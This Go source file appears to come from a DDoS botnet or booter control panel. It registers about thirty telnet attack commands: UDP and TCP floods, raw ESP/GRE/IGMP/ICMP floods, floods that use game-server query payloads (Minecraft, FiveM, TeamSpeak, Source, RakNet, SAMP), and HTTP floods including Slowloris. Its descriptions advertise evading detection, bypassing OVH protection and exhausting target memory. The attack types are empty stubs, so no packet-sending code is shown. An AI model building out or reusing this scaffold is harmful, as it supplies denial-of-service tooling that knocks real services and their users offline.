package user

type udpPPS struct {
}

type udpStorm struct {
}

type udpPower struct {
}

type udpOVH struct {
}

type tcpSyn struct {
}

type tcpAck struct {
}

type tcpMass struct {
}

type tcpRf struct {
}

type tcpSocket struct {
}

type tcpHalt struct {
}

type tcpDrop struct {
}

type tcpTfo struct {
}

type esp struct {
}

type gre struct {
}

type igmp struct {
}

type icmp struct {
}

type tcpMC struct {
}

type udpFiveM struct {
}

type udpTS3 struct {
}

type udpVSE struct {
}

type udpRakNet struct {
}

type udpSamp struct {
}

type httpFlood struct {
}

type httpBypass struct {
}

type httpSlow struct {
}

type httpSmart struct {
}

type httpLoad struct {
}

type httpExploit struct {
}

type httpBot struct {
}

func (s *TelnetSession) RegisterMethods() {
	// UDP (Layer 4)
	_, _ = s.manager.AddCommand("udp-pps", "Optimized for maximum PPS", "Performance optimized for maximum packets per second (PPS)", &udpPPS{})
	_, _ = s.manager.AddCommand("udp-storm", "Optimized for undetectable flooding", "Performance optimized for undetectable flooding", &udpStorm{})
	_, _ = s.manager.AddCommand("udp-power", "Optimized for high bandwidth", "Performance optimized for high bandwidth", &udpPower{})
	_, _ = s.manager.AddCommand("udp-ovh", "Optimized for bypassing OVH protection", "Performance optimized for bypassing OVH protection", &udpOVH{})
	
	// TCP (Layer 4)
	_, _ = s.manager.AddCommand("tcp-syn", "Sends TCP SYN packets", "Sends TCP raw packets with the SYN flag", &tcpSyn{})
	_, _ = s.manager.AddCommand("tcp-ack", "Sends TCP ACK packets", "Sends TCP raw packets with the ACK flag", &tcpAck{})
	_, _ = s.manager.AddCommand("tcp-mass", "Sends TCP XMAS packets", "Sends TCP raw packets with all flags set (XMAS)", &tcpMass{})
	_, _ = s.manager.AddCommand("tcp-rf", "Sends TCP with random flags", "Sends TCP raw packets with random flags and data", &tcpRf{})
	_, _ = s.manager.AddCommand("tcp-socket", "Creates high connection spam", "Creates normal TCP connections with high connection spam", &tcpSocket{})
	_, _ = s.manager.AddCommand("tcp-halt", "Creates TCP but interrupts after connection", "Creates normal TCP connections but interrupts after connection", &tcpHalt{})
	_, _ = s.manager.AddCommand("tcp-drop", "Sends TCP RST or FIN", "Sends TCP raw packets with random choices of RST or FIN flags", &tcpDrop{})
	_, _ = s.manager.AddCommand("tcp-tfo", "Sends SYN+ACK packets", "Sends TCP raw packets with the SYN+ACK flags", &tcpTfo{})
	
	// Layer 3
	_, _ = s.manager.AddCommand("esp", "Sends raw ESP packets", "Sends raw packets with ESP (Encapsulating Security Payload) headers", &esp{})
	_, _ = s.manager.AddCommand("gre", "Sends raw GRE packets", "Sends raw packets with GRE (Generic Routing Encapsulation) headers", &gre{})
	_, _ = s.manager.AddCommand("igmp", "Sends raw IGMP packets", "Sends raw packets with IGMP (Internet Group Management Protocol) headers", &igmp{})
	_, _ = s.manager.AddCommand("icmp", "Sends raw ICMP packets", "Sends raw packets with ICMP (Internet Control Message Protocol) headers", &icmp{})
	
	// Game
	_, _ = s.manager.AddCommand("tcp-mc", "Minecraft Status Ping payload", "Creates a TCP connection with a Minecraft Status Ping payload", &tcpMC{})
	_, _ = s.manager.AddCommand("udp-fivem", "FiveM Status Ping payload", "Sends UDP packets with a FiveM status ping payload", &udpFiveM{})
	_, _ = s.manager.AddCommand("udp-ts3", "TeamSpeak 3 Handshake payload", "Sends UDP packets with a TeamSpeak 3 handshake payload", &udpTS3{})
	_, _ = s.manager.AddCommand("udp-vse", "Valve Source Engine query payload", "Sends UDP packets with a Valve Source Engine query payload", &udpVSE{})
	_, _ = s.manager.AddCommand("udp-raknet", "RakNet payload", "Sends UDP packets with a RakNet payload", &udpRakNet{})
	_, _ = s.manager.AddCommand("udp-samp", "SAMP payload", "Sends UDP packets with a SAMP (San Andreas Multiplayer) payload", &udpSamp{})
	
	// HTTP (Layer 7)
	_, _ = s.manager.AddCommand("http-flood", "HTTP request flood", "Raw HTTP request flood optimized for performance and PPS", &httpFlood{})
	_, _ = s.manager.AddCommand("http-bypass", "HTTP flood with evasion", "HTTP flood optimized for evading detection", &httpBypass{})
	_, _ = s.manager.AddCommand("http-slow", "HTTP Slowloris attack", "HTTP Slowloris attack", &httpSlow{})
	_, _ = s.manager.AddCommand("http-smart", "Smart HTTP flood", "HTTP flood designed to follow cookies, paths, and fingerprints to evade detection", &httpSmart{})
	_, _ = s.manager.AddCommand("http-load", "High load HTTP flood", "HTTP-BYPASS with high data load to exhaust target memory", &httpLoad{})
	_, _ = s.manager.AddCommand("http-exploit", "Exploit HTTP flood", "HTTP flood using well-known DoS exploits to ensure target failure", &httpExploit{})
	_, _ = s.manager.AddCommand("http-bot", "Bot-like HTTP flood", "Floods the target like a search engine bot, spamming requests", &httpBot{})
}
